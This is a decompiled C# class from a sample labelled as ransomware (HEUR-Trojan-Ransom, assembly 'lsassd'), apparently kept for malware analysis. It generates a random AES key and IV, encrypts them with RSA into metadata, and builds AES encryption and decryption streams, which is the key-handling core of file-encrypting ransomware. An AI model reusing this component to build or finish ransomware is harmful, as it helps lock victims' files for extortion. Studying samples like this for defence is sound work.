// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.Session
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using System.IO;
using System.Security.Cryptography;

namespace MOISHE.Core
{
  public class Session
  {
    public RSAParameters KeyPair { get; set; }

    public byte[] DEK { get; set; }

    public byte[] IV { get; set; }

    public Session(RSAParameters keypair)
      : this()
    {
      this.KeyPair = keypair;
    }

    public Session() => this.RefreshKey();

    public void RefreshKey()
    {
      RandomNumberGenerator randomNumberGenerator = RandomNumberGenerator.Create();
      byte[] data1 = new byte[32];
      byte[] data2 = new byte[16];
      randomNumberGenerator.GetBytes(data1);
      randomNumberGenerator.GetBytes(data2);
      this.DEK = data1;
      this.IV = data2;
    }

    public EncryptionMetadata CreateMetadata()
    {
      EncryptionMetadata metadata = new EncryptionMetadata();
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      cryptoServiceProvider.ImportParameters(this.KeyPair);
      metadata.EncryptedKey = cryptoServiceProvider.Encrypt(this.DEK, false);
      metadata.EncryptedIV = cryptoServiceProvider.Encrypt(this.IV, false);
      metadata.PublicKey = this.ExportPublicKey();
      return metadata;
    }

    public byte[] ExportPublicKey() => KeyGenerator.ExportPublicKey(this.KeyPair);

    public byte[] ExportPrivateKey() => KeyGenerator.ExportPrivateKey(this.KeyPair);

    public CryptoStream CreateEncryptor(Stream underlying, PaddingMode padding)
    {
      Aes aes = Aes.Create();
      aes.Padding = padding;
      return new CryptoStream(underlying, aes.CreateEncryptor(this.DEK, this.IV), CryptoStreamMode.Write);
    }

    public CryptoStream CreateDecryptor(Stream underlying, PaddingMode padding)
    {
      Aes aes = Aes.Create();
      aes.Padding = padding;
      return new CryptoStream(underlying, aes.CreateDecryptor(this.DEK, this.IV), CryptoStreamMode.Write);
    }
  }
}
